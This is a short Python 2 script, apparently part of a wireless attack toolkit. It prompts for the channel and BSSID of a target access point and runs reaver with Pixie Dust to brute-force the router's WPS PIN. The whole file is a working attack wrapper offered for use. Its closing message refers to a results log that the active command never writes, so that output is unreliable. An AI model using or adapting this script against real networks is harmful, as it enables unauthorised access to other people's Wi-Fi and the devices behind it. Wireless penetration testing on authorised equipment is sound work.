#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
import time

monitor_Interface = "wlan1mon"
monitor_Channel = str(raw_input("Enter CHANNEL of AP target: "))
monitor_BSSID = str(raw_input("Enter BSSID of AP target: "))

logfile_Path = "/root/Cylon-Raider/logs/Heavy-Raider-Logs/"
logfile_Filename = monitor_BSSID + '.txt'
logfile_Fullpath = logfile_Path + logfile_Filename

# cmd_String = "reaver -i {0} -f -c {1} -b {2} -vv -K 1 -o {3}".format(
#     monitor_Interface,
#     monitor_Channel,
#     monitor_BSSID,
#     logfile_Fullpath
# )

cmd_String = "reaver -i {0} -f -c {1} -b {2} -vv -K 1".format(
    monitor_Interface,
    monitor_Channel,
    monitor_BSSID
)

print 'Command Parameters is...'
print cmd_String
print 'Starting Reaver brute-force now'
os.system(cmd_String)
print 'Reaver attack completed, check %s for results' % logfile_Fullpath
